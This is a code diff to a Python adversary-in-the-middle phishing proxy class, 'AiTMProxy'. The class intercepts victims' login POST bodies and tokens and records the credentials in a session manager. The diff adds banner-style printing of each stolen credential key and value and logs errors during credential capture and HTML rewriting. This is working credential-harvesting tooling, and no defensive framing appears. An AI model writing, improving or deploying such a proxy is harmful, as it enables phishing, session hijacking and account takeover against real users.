@@ -301,9 +301,11 @@ class AiTMProxy:
                         captured[key] = values[0] if values else ""
             
             if captured:
-                print(f"[AiTM] Credentials captured for session {session_id}: {captured}")
+                print(f"🎯 [AiTM] CREDENTIALS CAPTURED for session {session_id}:")
                 for k, v in captured.items():
+                    print(f"   🔑 {k}: {v}")
                     self.session_manager.capture_credential(session_id, k, v)
+                print("🎯" + "="*50)
                     
         except Exception as e:
             print(f"[AiTM Warning] Failed to parse POST body: {e}")
@@ -332,7 +334,8 @@ class AiTMProxy:
                     print(f"[AiTM] Tokens captured for session {session_id}: {captured}")
                     for k, v in captured.items():
                         self.session_manager.capture_credential(session_id, k, v)
-        except:
+        except Exception as e:
+            print(f"Warning: Credential capture failed: {e}")
             pass
 
 
@@ -565,7 +568,8 @@ class AiTMProxy:
             text = import_pattern.sub(replace_import, text)
             
             return text.encode('utf-8')
-        except:
+        except Exception as e:
+            print(f"Warning: HTML rewrite failed: {e}")
             return content
 
     def rewrite_json(self, content: bytes, base_url: str, proxy_base_path: str = "") -> bytes:
